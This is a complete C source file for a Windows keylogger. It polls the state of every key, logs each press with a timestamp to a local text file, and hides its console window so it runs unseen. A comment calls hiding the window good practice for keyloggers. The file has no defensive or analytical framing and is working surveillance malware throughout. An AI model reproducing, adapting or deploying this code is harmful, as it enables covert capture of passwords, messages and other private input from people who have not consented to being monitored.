#include <stdio.h>
#include <windows.h>
#include <ctype.h>
#include <time.h>
#include <stdbool.h>

#define LOG_FILE "keystrokes.txt"
#define TIMESTAMP_FORMAT "%Y-%m-%d %H:%M:%S"
#define MAX_TIMESTAMP_LENGTH 20

// Function to get the current timestamp
void get_timestamp(char *timestamp, size_t timestamp_size) {
    time_t rawtime;
    struct tm *timeinfo;

    time(&rawtime);
    timeinfo = localtime(&rawtime);

    if (strftime(timestamp, timestamp_size, TIMESTAMP_FORMAT, timeinfo) == 0) {
        fprintf(stderr, "Error: Timestamp buffer too small.\n");
        timestamp[0] = '\0'; // Ensure null termination in case of error
    }
}

void log_keystroke(int key) {
    FILE *file = fopen(LOG_FILE, "a");
    if (file == NULL) {
        perror("Error opening keystrokes.txt");
        return; // Exit the function if file opening fails
    }

    char timestamp[MAX_TIMESTAMP_LENGTH];
    get_timestamp(timestamp, sizeof(timestamp));

    fprintf(file, "[%s] ", timestamp);

    // Handle special keys and printable characters
    switch (key) {
        case VK_SPACE:
            fprintf(file, " ");
            break;
        case VK_RETURN:
            fprintf(file, "\n");
            break;
        case VK_TAB:
            fprintf(file, "\t");
            break;
        case VK_BACK:
            fprintf(file, "[BACKSPACE]");
            break;
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            fprintf(file, "[SHIFT]");
            break;
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            fprintf(file, "[CTRL]");
            break;
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            fprintf(file, "[ALT]");
            break;
        default:
            if (key >= 0x30 && key <= 0x5A) { // Alphanumeric characters
                fprintf(file, "%c", (char)key);
            } else {
                fprintf(file, "[KEY:%d]", key); // Log the key code if not handled
            }
            break;
    }

    fprintf(file, "\n");
    if (fclose(file) == EOF) {
        perror("Error closing keystrokes.txt");
    }
}

int main() {
    int key;
    // Hide the console window (optional, but good practice for keyloggers)
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Debouncing mechanism
    bool key_pressed[256] = {false}; // Array to track key states

    while (1) {
        for (key = 1; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                if (!key_pressed[key]) { // Only log if the key wasn't already pressed
                    log_keystroke(key);
                    key_pressed[key] = true; // Mark the key as pressed
                }
            } else {
                key_pressed[key] = false; // Reset the key state when released
            }
        }
        Sleep(1); // Reduce CPU usage
    }
    return 0;
}